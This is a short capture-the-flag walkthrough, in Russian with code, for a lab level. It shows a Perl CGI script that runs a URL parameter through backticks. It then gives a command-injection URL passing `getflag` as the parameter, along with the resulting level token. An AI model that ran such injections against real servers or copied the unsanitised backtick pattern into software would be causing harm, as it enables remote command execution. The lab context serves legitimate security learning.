@@ -1,0 +1,26 @@
+level04
+
+ls
+level04.pl
+Это perl скрипт
+
+cat level04.pl:
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+$y = $_[0];
+print `echo $y 2>&1`;
+}
+x(param("x"));
+
+#Он принимает в себя параметр X и через echo выводит результат
+#Чтобы исполнить скрипт используем curl OurIP Port(localhost:4747)/ScriptName.pl?x=`getflag`
+http://192.168.56.101:4747/?x=`getflag`
+Check your flag.Here is eour token : ne2searoevaevoem4ov4ar8ap
+
+su level05
+ne2searoevaevoem4ov4ar8ap
+
+Done!
